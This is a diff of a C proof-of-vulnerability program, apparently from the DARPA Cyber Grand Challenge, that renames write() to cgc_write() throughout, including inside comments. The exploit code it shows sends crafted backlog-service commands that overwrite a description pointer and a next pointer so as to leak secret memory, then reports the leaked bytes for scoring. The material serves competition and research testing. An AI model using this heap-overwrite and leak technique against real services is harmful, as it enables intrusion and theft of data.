@@ -61,7 +61,7 @@ typedef struct {
 
 
 int receive_bytes (int fd, void *buffer, size_t count);
-int write( int fd, void *buffer, size_t count );
+int cgc_write( int fd, void *buffer, size_t count );
 void eat_line(int fd);
 
 int main(void)
@@ -89,10 +89,10 @@ unsigned char byte;
 
 	pov_type = 2;
 
-	// safe area of the heap to read from to avoid segfaults
+	// safe area of the heap to cgc_read from to avoid segfaults
 	newStringPtr = 0xb7fff012;
 
-	if (write(3, &pov_type, sizeof(pov_type)) == -1)
+	if (cgc_write(3, &pov_type, sizeof(pov_type)) == -1)
 		_terminate(-1);
 
 
@@ -113,13 +113,13 @@ unsigned char byte;
 	command.command = 0x101;
 
 
-	if (write(STDOUT, (void *)&command, sizeof(baseCommandType)-2) == -1)
+	if (cgc_write(STDOUT, (void *)&command, sizeof(baseCommandType)-2) == -1)
 		_terminate(-1);
 
-	if (write(STDOUT, "1", 2) == -1)
+	if (cgc_write(STDOUT, "1", 2) == -1)
 		_terminate(-1);
 
-    // now write an entry to the product backlog
+    // now cgc_write an entry to the product backlog
 	command2.flag = 0x12345678;
 	command2.command = 0x102;
 	command2.len = 8;
@@ -130,14 +130,14 @@ unsigned char byte;
 	command2.title[1] = 0;
 
 
-	if (write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)) == -1)
+	if (cgc_write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)) == -1)
 		_terminate(-1);
 
-    // write a second entry to the product backlog
+    // cgc_write a second entry to the product backlog
 	command2.blid = 2;
 	command2.title[0] = 'b';
 
-	if (write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)) == -1)
+	if (cgc_write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)) == -1)
 		_terminate(-1);
 
 
@@ -150,7 +150,7 @@ unsigned char byte;
 	command3.title[0] = 'c';
 	command3.title[1] = 0;
 
-	if (write(STDOUT, (void *)&command3, 14) == -1)
+	if (cgc_write(STDOUT, (void *)&command3, 14) == -1)
 		_terminate(-1);
 
 
@@ -161,7 +161,7 @@ unsigned char byte;
 	command2.points = 1;
 	command2.blid = 1;
 
-	if (write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)) == -1)
+	if (cgc_write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)) == -1)
 		_terminate(-1);
 
 
@@ -171,21 +171,21 @@ unsigned char byte;
 	command2.command = 0x503;
 	command2.len = 34;
 
-	if (write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)-2) == -1)
+	if (cgc_write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)-2) == -1)
 		_terminate(-1);
 
-	if (write(STDOUT, (void *)buffer, 20) == -1)
+	if (cgc_write(STDOUT, (void *)buffer, 20) == -1)
 		_terminate(-1);	
 
 	type2_addr += 2;
 
 	// this will overwrite the pointer to the backlog item's description string
-	if (write(STDOUT, (void *)&newStringPtr, sizeof(newStringPtr)) == -1)
+	if (cgc_write(STDOUT, (void *)&newStringPtr, sizeof(newStringPtr)) == -1)
 		_terminate(-1);
 
 	// this will overwrite the bl item's next pointer.
 	// Make it also point to the secret data area as a backup to the overwrite above, which will fail if the first 4 bytes contain a null
-	if (write(STDOUT, (void *)&type2_addr, sizeof(type2_addr)) == -1)
+	if (cgc_write(STDOUT, (void *)&type2_addr, sizeof(type2_addr)) == -1)
 		_terminate(-1);
 
 
@@ -195,7 +195,7 @@ unsigned char byte;
 	command.id = 1;
 	command.len = 4;
 
-	if (write(STDOUT, (void *)&command, sizeof(baseCommandType)) == -1)
+	if (cgc_write(STDOUT, (void *)&command, sizeof(baseCommandType)) == -1)
 		_terminate(-1);
 
 
@@ -210,7 +210,7 @@ unsigned char byte;
 	// otherwise the POV will hang waiting for input that isn't coming
 	if (c == 0x0a) {
 
-		write(3, &leaked_value1, 4);
+		cgc_write(3, &leaked_value1, 4);
 		_terminate(-1);
 	}
 
@@ -226,7 +226,7 @@ unsigned char byte;
 
 	leaked_value1 = 0;
 
-	// first read an unsigned short that is now the item's ID
+	// first cgc_read an unsigned short that is now the item's ID
 	while(1) {
 
 		receive_bytes(STDIN, &byte, 1);
@@ -243,7 +243,7 @@ unsigned char byte;
 
 	leaked_value2 = 0;
 
-	// now read an unsigned short that is the items' total "points".
+	// now cgc_read an unsigned short that is the items' total "points".
 	while(1) {
 
 		receive_bytes(STDIN, &byte, 1);
@@ -255,15 +255,15 @@ unsigned char byte;
 
 	}
 
-	// write the two leaked values to the server for validation.
-	write(3, &leaked_value1, 2);
-	write(3, &leaked_value2, 2);
+	// cgc_write the two leaked values to the server for validation.
+	cgc_write(3, &leaked_value1, 2);
+	cgc_write(3, &leaked_value2, 2);
 
   // now terminate the program
 	command.command = 0xdead;
 	command.len = 0;
 
-	if (write(STDOUT, (void *)&command, sizeof(baseCommandType)) == -1)
+	if (cgc_write(STDOUT, (void *)&command, sizeof(baseCommandType)) == -1)
 		_terminate(-1);
 
 }
@@ -299,7 +299,7 @@ return 0;
 }
 
 
-int write( int fd, void *buffer, size_t count )
+int cgc_write( int fd, void *buffer, size_t count )
 {
 	size_t written;
     int total_written;
